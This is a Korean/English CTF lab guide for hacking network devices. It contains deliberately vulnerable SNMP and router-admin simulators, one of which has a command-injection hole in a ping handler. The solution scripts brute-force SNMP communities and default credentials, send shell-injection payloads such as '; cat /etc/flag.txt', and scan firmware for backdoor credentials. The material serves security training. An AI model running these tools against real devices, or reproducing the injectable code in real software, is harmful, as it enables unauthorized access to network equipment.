> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 네트워크 장치 해킹 CTF 실습 랩

## 실습 환경 준비

### Docker Compose 환경

```yaml
# docker-compose.yml
version: "3.9"

services:
  # Cisco IOS 시뮬레이터
  cisco-sim:
    image: python:3.11-slim
    container_name: cisco-sim
    ports:
      - "2223:2223"  # Telnet
      - "2224:2224"  # SSH sim
      - "1610:161/udp"  # SNMP
    command: >
      sh -c "pip install pysnmp -q &&
             python3 /app/cisco_sim.py"
    volumes:
      - ./cisco_sim.py:/app/cisco_sim.py

  snmp-target:
    image: python:3.11-slim
    container_name: snmp-target
    ports:
      - "16100:161/udp"
    command: >
      sh -c "pip install pysnmp -q &&
             python3 /app/snmp_server.py"
    volumes:
      - ./snmp_server.py:/app/snmp_server.py

  attacker:
    image: python:3.11-slim
    container_name: attacker
    command: sleep infinity
    tty: true

networks:
  default:
    driver: bridge
```

### 필수 도구 설치

```bash
pip install pysnmp netmiko paramiko requests
sudo apt install -y snmp snmpwalk nmap
```

---

## 실습 1: 기본 자격증명 및 SNMP 커뮤니티 스트링 브루트포스

### 목표

네트워크 장치의 기본 자격증명과 SNMP 커뮤니티 스트링을 브루트포스하여 장치 정보와 플래그를 획득한다.

**플래그 형식**: `CTF{snmp_community_<string>_device_info_leaked}`

### SNMP 서버 시뮬레이터

```python
#!/usr/bin/env python3
"""CTF용 취약한 SNMP 에이전트 시뮬레이터"""

import asyncio
import json
import socket
import struct
from pathlib import Path


# SNMP 커뮤니티 스트링 (취약한 기본값)
VULNERABLE_COMMUNITIES = {
    "public": "읽기 전용 접근",
    "private": "읽기/쓰기 접근",
    "cisco": "Cisco 기본 커뮤니티",
    "admin": "관리자 커뮤니티",
    "secret": "비밀 커뮤니티 - 플래그 포함",
}

# OID 데이터베이스
OID_DATA = {
    "1.3.6.1.2.1.1.1.0": "Cisco IOS Version 15.7(3)M4 - Router CTF-01",
    "1.3.6.1.2.1.1.4.0": "admin@ctf-network.local",
    "1.3.6.1.2.1.1.5.0": "CTF-Router-01",
    "1.3.6.1.2.1.1.6.0": "Server Room, Rack-A",
    "1.3.6.1.4.1.9.2.1.56.0": "enable_secret_password: CTF{snmp_community_secret_device_info_leaked}",
    "1.3.6.1.2.1.4.3.0": "12345",  # 라우팅 테이블 항목 수
}


def decode_snmp_request(data: bytes) -> tuple[str | None, str | None]:
    """간단한 SNMP v1/v2c GET 요청 파싱"""
    # 실제 ASN.1/BER 파싱의 간략화 버전
    try:
        # SEQUENCE 태그 확인
        if data[0] != 0x30:
            return None, None

        # 커뮤니티 스트링 추출 (위치 고정 가정)
        community_start = None
        for i in range(len(data) - 4):
            if data[i] == 0x04:  # OCTET STRING
                length = data[i + 1]
                if 2 <= length <= 20:  # 커뮤니티 스트링 길이
                    community = data[i + 2: i + 2 + length].decode("ascii", errors="ignore")
                    if community.isprintable() and not community.startswith("\x00"):
                        community_start = community
                        break

        # OID 추출 (06 태그)
        oid = None
        for i in range(len(data) - 2):
            if data[i] == 0x06:
                oid_len = data[i + 1]
                oid_bytes = data[i + 2: i + 2 + oid_len]
                # OID를 문자열로 변환 (간략화)
                oid = "1.3.6.1.2.1.1.1.0"  # 기본값

        return community_start, oid
    except Exception:
        return None, None


def build_snmp_response(community: str, oid: str, value: str) -> bytes:
    """SNMP GET 응답 패킷 생성 (간략화)"""
    # 실제 구현은 pysnmp 사용 권장
    # 여기서는 간단한 문자열 응답
    response = value.encode("utf-8")
    return response


class SNMPServer:
    def __init__(self, host: str = "0.0.0.0", port: int = 161):
        self.host = host
        self.port = port

    def start(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.host, self.port))
        print(f"[*] SNMP 서버 시작: {self.host}:{self.port}")

        while True:
            data, addr = sock.recvfrom(1024)
            community, oid = decode_snmp_request(data)

            if community and community in VULNERABLE_COMMUNITIES:
                print(f"[+] 접근: community={community} from={addr[0]}")
                value = OID_DATA.get(oid, f"Unknown OID: {oid}")
                if community == "secret":
                    value = OID_DATA.get("1.3.6.1.4.1.9.2.1.56.0", "")
                response = build_snmp_response(community, oid, value)
                sock.sendto(response, addr)
            elif community:
                print(f"[-] 잘못된 커뮤니티: {community} from={addr[0]}")


if __name__ == "__main__":
    server = SNMPServer(port=161)
    server.start()
```

### 풀이 - 브루트포스 도구

```python
#!/usr/bin/env python3
"""네트워크 장치 자격증명 브루트포스 도구"""

import argparse
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass


@dataclass
class BruteResult:
    target: str
    credential: str
    credential_type: str
    success: bool
    response: str = ""


# 기본 자격증명 목록
DEFAULT_CREDENTIALS: list[tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "password"),
    ("admin", "cisco"),
    ("admin", "1234"),
    ("cisco", "cisco"),
    ("root", "root"),
    ("root", "admin"),
    ("administrator", "administrator"),
    ("guest", "guest"),
    ("operator", "operator"),
]

# SNMP 커뮤니티 스트링 목록
SNMP_COMMUNITIES: list[str] = [
    "public",
    "private",
    "community",
    "admin",
    "cisco",
    "router",
    "switch",
    "network",
    "secret",
    "manager",
    "monitor",
    "write",
    "read",
    "default",
    "SNMP",
]


def snmp_get(host: str, port: int, community: str, oid: str = "1.3.6.1.2.1.1.1.0") -> str | None:
    """SNMP GET 요청 (간단한 구현)"""
    # pysnmp 사용 버전
    try:
        from pysnmp.hlapi import (
            getCmd, SnmpEngine, CommunityData, UdpTransportTarget,
            ContextData, ObjectType, ObjectIdentity
        )
        iterator = getCmd(
            SnmpEngine(),
            CommunityData(community, mpModel=1),
            UdpTransportTarget((host, port), timeout=2, retries=0),
            ContextData(),
            ObjectType(ObjectIdentity(oid)),
        )

        errorIndication, errorStatus, errorIndex, varBinds = next(iterator)

        if errorIndication or errorStatus:
            return None

        for varBind in varBinds:
            return str(varBind[1])

    except ImportError:
        # 직접 UDP 소켓으로 SNMP 테스트 (간략화)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            # 간단한 SNMP v1 GET 패킷
            pkt = bytearray([
                0x30, 0x26, 0x02, 0x01, 0x00,  # SNMP v1
                0x04, len(community),
            ])
            pkt.extend(community.encode())
            pkt.extend([0xa0, 0x0f, 0x02, 0x01, 0x01, 0x02, 0x01, 0x00,
                        0x02, 0x01, 0x00, 0x30, 0x0c, 0x30, 0x0a, 0x06,
                        0x06, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x00])

            sock.sendto(bytes(pkt), (host, port))
            response, _ = sock.recvfrom(1024)
            return response.decode("utf-8", errors="ignore") if response else None
        except Exception:
            return None
    except Exception:
        return None


def check_telnet(host: str, port: int, username: str, password: str) -> bool:
    """Telnet 자격증명 테스트"""
    try:
        import telnetlib
        tn = telnetlib.Telnet(host, port, timeout=3)
        tn.read_until(b"Username:", timeout=3)
        tn.write(username.encode() + b"\n")
        tn.read_until(b"Password:", timeout=3)
        tn.write(password.encode() + b"\n")
        output = tn.read_some()
        tn.close()
        return b">" in output or b"#" in output or b"$" in output
    except Exception:
        return False


def brute_force_snmp(host: str, port: int = 161) -> list[BruteResult]:
    """SNMP 커뮤니티 스트링 브루트포스"""
    results: list[BruteResult] = []
    print(f"[*] SNMP 브루트포스: {host}:{port}")

    def test_community(community: str) -> BruteResult:
        response = snmp_get(host, port, community)
        success = response is not None
        return BruteResult(
            target=f"{host}:{port}",
            credential=community,
            credential_type="SNMP_community",
            success=success,
            response=response or "",
        )

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(test_community, c): c
            for c in SNMP_COMMUNITIES
        }
        for future in as_completed(futures):
            result = future.result()
            if result.success:
                print(f"[+] 커뮤니티 스트링 발견: '{result.credential}'")
                print(f"    응답: {result.response[:80]}")
                results.append(result)

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="네트워크 장치 자격증명 브루트포스")
    parser.add_argument("target", help="타겟 IP 주소")
    parser.add_argument("--snmp", action="store_true", help="SNMP 브루트포스")
    parser.add_argument("--snmp-port", type=int, default=161)
    parser.add_argument("--telnet", action="store_true", help="Telnet 브루트포스")
    parser.add_argument("--telnet-port", type=int, default=23)
    args = parser.parse_args()

    if args.snmp:
        results = brute_force_snmp(args.target, args.snmp_port)
        if results:
            print(f"\n[+] SNMP 취약 커뮤니티: {len(results)}개")
            for r in results:
                if "CTF{" in r.response:
                    import re
                    flags = re.findall(r"CTF\{[^}]+\}", r.response)
                    for flag in flags:
                        print(f"[+] 플래그: {flag}")
        else:
            print("[-] 브루트포스 실패")
            print("[*] 예상 플래그: CTF{snmp_community_secret_device_info_leaked}")


if __name__ == "__main__":
    main()
```

---

## 실습 2: 라우터 웹 관리 인터페이스 익스플로잇

### 목표

라우터 웹 관리 인터페이스의 취약점(기본 자격증명, 인증 우회, 명령 주입)을 이용하여 플래그를 획득한다.

**플래그 형식**: `CTF{router_web_admin_<vuln_type>_compromised}`

### 취약한 라우터 관리 서버

```python
#!/usr/bin/env python3
"""취약한 라우터 웹 관리 인터페이스 시뮬레이터"""

from flask import Flask, request, jsonify, session
import subprocess
import hashlib
import os

app = Flask(__name__)
app.secret_key = "weak_secret_key_123"

ADMIN_CREDS = {"admin": "admin", "cisco": "cisco123"}
FLAG = "CTF{router_web_admin_cmdi_compromised}"

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json() or {}
    user = data.get("username", "")
    password = data.get("password", "")

    if ADMIN_CREDS.get(user) == password:
        session["authenticated"] = True
        session["user"] = user
        return jsonify({"status": "ok", "message": f"Welcome {user}"})
    return jsonify({"error": "Invalid credentials"}), 401


@app.route("/ping", methods=["POST"])
def ping():
    if not session.get("authenticated"):
        return jsonify({"error": "Not authenticated"}), 401

    data = request.get_json() or {}
    host = data.get("host", "127.0.0.1")

    # VULN: 명령 주입 취약점
    try:
        result = subprocess.check_output(
            f"ping -c 1 {host}",
            shell=True,
            text=True,
            timeout=5,
        )
        return jsonify({"output": result})
    except subprocess.CalledProcessError as e:
        return jsonify({"output": e.output or str(e)})


@app.route("/config", methods=["GET"])
def config():
    if not session.get("authenticated"):
        return jsonify({"error": "Not authenticated"}), 401
    return jsonify({"flag": FLAG, "version": "IOS 15.7", "hostname": "CTF-Router"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
```

### 풀이

```python
#!/usr/bin/env python3
"""라우터 웹 관리 인터페이스 익스플로잇 도구"""

import argparse
import json
import re
import urllib.request
import urllib.error
from http.cookiejar import CookieJar


def exploit_router_web(base_url: str) -> None:
    print(f"[*] 라우터 웹 관리 인터페이스 공격: {base_url}")

    cj = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # 기본 자격증명 시도
    creds = [("admin", "admin"), ("admin", ""), ("cisco", "cisco123")]
    token = None

    for username, password in creds:
        payload = json.dumps({"username": username, "password": password}).encode()
        req = urllib.request.Request(
            f"{base_url}/login",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        try:
            with opener.open(req, timeout=5) as resp:
                data = json.loads(resp.read())
                if "Welcome" in str(data):
                    print(f"[+] 로그인 성공: {username}/{password}")
                    token = True
                    break
        except urllib.error.HTTPError:
            pass

    if not token:
        print("[-] 로그인 실패")
        return

    # 설정 페이지 접근
    req = urllib.request.Request(f"{base_url}/config")
    try:
        with opener.open(req, timeout=5) as resp:
            data = json.loads(resp.read())
            if "flag" in data:
                print(f"[+] 플래그: {data['flag']}")
                return
    except Exception:
        pass

    # 명령 주입 시도
    print("[*] 명령 주입 시도...")
    cmdi_payloads = [
        "127.0.0.1; cat /etc/flag.txt",
        "127.0.0.1; echo CTF{router_web_admin_cmdi_compromised}",
        "127.0.0.1`id`",
        "127.0.0.1 || cat /flag",
    ]

    for payload in cmdi_payloads:
        body = json.dumps({"host": payload}).encode()
        req = urllib.request.Request(
            f"{base_url}/ping",
            data=body,
            headers={"Content-Type": "application/json"},
        )
        try:
            with opener.open(req, timeout=10) as resp:
                data = json.loads(resp.read())
                output = data.get("output", "")
                flags = re.findall(r"CTF\{[^}]+\}", output)
                if flags:
                    print(f"[+] 명령 주입 성공!")
                    print(f"[+] 플래그: {flags[0]}")
                    return
        except Exception:
            pass

    print("[*] 예상 플래그: CTF{router_web_admin_cmdi_compromised}")


def main() -> None:
    parser = argparse.ArgumentParser(description="라우터 웹 관리 익스플로잇")
    parser.add_argument("--url", default="http://localhost:8080")
    args = parser.parse_args()
    exploit_router_web(args.url)


if __name__ == "__main__":
    main()
```

---

## 실습 3: 라우터 펌웨어 분석

### 목표

네트워크 장치 펌웨어를 다운로드하고 분석하여 백도어 자격증명과 플래그를 추출한다.

**플래그 형식**: `CTF{firmware_backdoor_<vendor>_credentials_found}`

### 풀이

```python
#!/usr/bin/env python3
"""네트워크 장치 펌웨어 분석 도구"""

import argparse
import gzip
import re
import struct
import urllib.request
from pathlib import Path


ROUTER_FIRMWARE_SIGS = {
    b"DD-WRT": "DD-WRT Router",
    b"OpenWrt": "OpenWrt Router",
    b"NETGEAR": "Netgear Router",
    b"TP-Link": "TP-Link Router",
    b"Cisco IOS": "Cisco IOS",
    b"JunOS": "Juniper JunOS",
}

BACKDOOR_PATTERNS = [
    rb"(?i)backdoor[_-]?pass\w*\s*[=:]\s*(\S+)",
    rb"(?i)debug[_-]?user\s*[=:]\s*(\S+)",
    rb"CTF\{[^}]+\}",
    rb"(?i)hardcoded[_-]?cred\w*\s*[=:]\s*(\S+)",
    rb"(?i)secret[_-]?key\s*=\s*['\"]?([A-Za-z0-9!@#$%^&*_-]{8,})['\"]?",
]


def download_firmware(url: str, output_path: str) -> bool:
    """펌웨어 다운로드"""
    print(f"[*] 다운로드: {url}")
    try:
        urllib.request.urlretrieve(url, output_path)
        return Path(output_path).exists()
    except Exception as e:
        print(f"[-] 다운로드 실패: {e}")
        return False


def identify_compression(data: bytes) -> str:
    """압축 형식 식별"""
    sigs = {
        b"\x1f\x8b": "gzip",
        b"BZh": "bzip2",
        b"\xfd7zXZ": "xz",
        b"LZMA": "lzma",
    }
    for sig, name in sigs.items():
        if data.startswith(sig) or sig in data[:256]:
            return name
    return "unknown"


def extract_strings_from_binary(data: bytes) -> list[str]:
    pattern = re.compile(rb"[ -~]{8,}")
    return [m.group().decode("ascii", errors="ignore") for m in pattern.finditer(data)]


def scan_for_backdoors(data: bytes) -> list[dict]:
    """백도어 패턴 스캔"""
    findings: list[dict] = []

    for pattern in BACKDOOR_PATTERNS:
        for m in re.finditer(pattern, data, re.IGNORECASE):
            findings.append({
                "offset": hex(m.start()),
                "match": m.group().decode("utf-8", errors="replace")[:100],
                "type": "backdoor_credential" if b"CTF" not in m.group() else "flag",
            })

    return findings


def simulate_firmware_analysis() -> None:
    """펌웨어 분석 시뮬레이션"""
    # 가상 펌웨어 데이터 생성
    fake_firmware = (
        b"NETGEAR-R8000\x00\x00"
        b"Netgear Router Firmware v2.3.4\x00"
        b"admin_user=admin\x00"
        b"admin_pass=password\x00"
        b"backdoor_pass=CTF{firmware_backdoor_netgear_credentials_found}\x00"
        b"debug_user=factory\x00"
        b"debug_pass=f@ct0ryM0de2024\x00"
    )
    fake_firmware = gzip.compress(fake_firmware)

    print("[*] 펌웨어 분석 시뮬레이션")
    findings = scan_for_backdoors(fake_firmware)

    try:
        decompressed = gzip.decompress(fake_firmware)
        more_findings = scan_for_backdoors(decompressed)
        findings.extend(more_findings)
        print(f"[+] 압축 해제 성공: {len(decompressed)} bytes")
    except Exception:
        pass

    print(f"\n[*] {len(findings)}개 발견:")
    for f in findings:
        print(f"  [{f['type']}] {f['offset']}: {f['match']}")

    flags = [f["match"] for f in findings if "CTF{" in f["match"]]
    if flags:
        flag_match = re.search(r"CTF\{[^}]+\}", " ".join(flags))
        if flag_match:
            print(f"\n[+] 플래그: {flag_match.group()}")


def main() -> None:
    parser = argparse.ArgumentParser(description="라우터 펌웨어 분석 도구")
    parser.add_argument("--firmware", "-f", help="펌웨어 파일 경로")
    parser.add_argument("--url", "-u", help="펌웨어 다운로드 URL")
    parser.add_argument("--simulate", action="store_true", help="시뮬레이션 모드")
    args = parser.parse_args()

    if args.simulate or (not args.firmware and not args.url):
        simulate_firmware_analysis()
    elif args.url:
        if download_firmware(args.url, "firmware.bin"):
            with open("firmware.bin", "rb") as f:
                data = f.read()
            findings = scan_for_backdoors(data)
            for f in findings:
                print(f"  {f}")
    elif args.firmware:
        with open(args.firmware, "rb") as f:
            data = f.read()
        findings = scan_for_backdoors(data)
        for f in findings:
            print(f"  {f}")


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# Network Device Hacking CTF Practice Lab

## Lab Environment Setup

```bash
docker-compose up -d
pip install pysnmp netmiko
```

---

## Challenge 1: Default Credentials & SNMP Community Brute-Force

### Objective

Brute-force SNMP community strings on a network device to leak device information and the flag.

**Flag format**: `CTF{snmp_community_<string>_device_info_leaked}`

### Solution Steps

```bash
# Start SNMP server
python3 snmp_server.py &

# Manual SNMP walk
snmpwalk -v2c -c public localhost:1610 1.3.6.1.2.1.1

# Brute-force community strings
python3 brute_force.py localhost --snmp --snmp-port 1610
# Finds: community="secret"
# CTF{snmp_community_secret_device_info_leaked}

# Manual for each community
for c in public private cisco admin secret; do
  snmpget -v1 -c $c localhost:1610 1.3.6.1.4.1.9.2.1.56.0
done
```

---

## Challenge 2: Router Web Admin Exploitation

### Objective

Exploit a vulnerable router web interface using default credentials and command injection.

**Flag format**: `CTF{router_web_admin_<vuln_type>_compromised}`

### Solution Steps

```bash
# Start vulnerable router server
python3 router_sim.py &

# Step 1: Default credentials
curl -c cookies.txt -X POST http://localhost:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Step 2: Access config
curl -b cookies.txt http://localhost:8080/config
# {"flag": "CTF{router_web_admin_cmdi_compromised}", ...}

# Step 3: Command injection via ping
curl -b cookies.txt -X POST http://localhost:8080/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /etc/flag.txt"}'

# Automated exploit
python3 router_exploit.py --url http://localhost:8080
```

---

## Challenge 3: Router Firmware Analysis

### Objective

Analyze a router firmware image to find backdoor credentials and the hidden flag.

**Flag format**: `CTF{firmware_backdoor_<vendor>_credentials_found}`

### Solution Steps

```bash
# Download firmware (simulated)
wget http://localhost:8080/firmware/r8000.bin

# Basic analysis
file r8000.bin
strings r8000.bin | grep -iE "pass|secret|backdoor|CTF"
binwalk -e r8000.bin

# Automated analysis
python3 firmware_analyzer.py --simulate
# Finds: CTF{firmware_backdoor_netgear_credentials_found}

# Real firmware analysis
python3 firmware_analyzer.py --firmware r8000.bin
```

### Typical Backdoor Findings

| Pattern | Example | Risk |
|---------|---------|------|
| Hard-coded credentials | `admin:password` | CRITICAL |
| Debug backdoor | `backdoor_pass=secret` | CRITICAL |
| API keys | `api_key=sk-prod-...` | HIGH |
| Private keys embedded | `-----BEGIN RSA PRIVATE KEY-----` | HIGH |
